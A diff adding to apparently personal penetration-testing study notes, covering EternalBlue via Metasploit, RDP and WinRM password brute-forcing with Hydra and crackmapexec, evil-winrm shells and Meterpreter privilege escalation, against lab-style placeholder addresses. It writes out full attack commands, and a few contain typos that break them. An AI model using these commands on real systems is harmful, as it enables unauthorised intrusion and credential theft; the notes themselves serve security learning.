@@ -79,3 +79,59 @@ _with metasploit_
 _use psexec with metasploit_
 
 1. in msfconsole search: `search psexec`, looking for`exploit/windows/smb/psexec`, fill in options
+
+**Eternal Blue**
+
+1. nmap script to check if internal blue `sudo nmap -sV -p 445 --script=smb-vuln-ms17.010 10.10.x.x`
+2. msfconsole: `search eternalblue`
+3. `use exploit/windows/smb/ms17:010_eternalblue`
+4. set options
+
+**Exploiting RDP**
+
+- RDP uses TCP port 3389 by default, and can also be configured to run on any other TCP port
+- preform a bruteforce
+
+1. preform nmap: `nmap -sV -p- 10.10.x.x`
+2. verify RDP port by using msfconsole: `service postgresql start && msfconsole`
+3. search msfconsole: `search rdp_scanner` (auxilary/scanner/rdp/rdp_scanner)
+4. set options: `set RHOSTS` & `set RPORT` and run
+5. brute-force HYDRA: `hydra -L /usr/share/metasploit-framework/data/wordlists/common_user.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.10.x.x -s <port>`
+6. xfreerdp with creds: `xfreerdp /u:username /p:password /v:10.10.x.x:port`
+
+**Exploit WinRM**
+
+- Windows remote managment facilitates remote access with windows systems over HTTP(s)
+- WinRM Typically uses TCP port 5985 and 5986(HTTPS)
+- can use crackmapexec to perform a brute-force on WinRM
+- also evil-winrm to optain command shell
+
+1. scan with nmap `nmap -sV -sC -p5000-6000 10.10.x.x` , the result will not say that it is WinRM, but from the port number we can deduce it
+2. use crackmapexec to both confirm and brute force: `crackmapecex`
+3. In crackmapexec: `crackmapexec winrm 10.10.x.x -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
+4. after opataining creds check command with -x: `crackmapexec winrm 10.10.x.x -u administrator -p tinkerbell -x "whoami"` or "systeminfo"
+5. evil-winrm to get shell: `evil-winrm.rb -u administrator -p 'tinkerbell' -i 10.2.19.116`
+6. find flag
+
+_meterpreter_
+
+1. `service postgresql start && msfconsole`
+2. search: `search winrm_script`, look for exploit/windows/winrm/winrm_script_excec
+3. set options + also set FORCE_VBS true
+
+## Privelege Escalation
+
+**meterpreter elevation**
+
+- in msfconsole you can use the privelege escalation suggester.
+
+1. when logged in to meterpreter, on the system you have compromised with low level creds, type `getsystem` to see if you can just raise priveleges that way. if not go to step 2.
+2. after gaining access to the machine in msfconsole(nmap scan then get creds(low level), then get access), background the session( `background` see picture) search for `search suggester`
+   ![alt text](/assets/meterpreter_background_session.png)
+3. `use post/multi/recon/local_exploit_suggester`
+4. run one of the following that fits
+
+**Windows Kernel exploits**
+
+- user mode, limited access
+- kernel mode, highest level of access
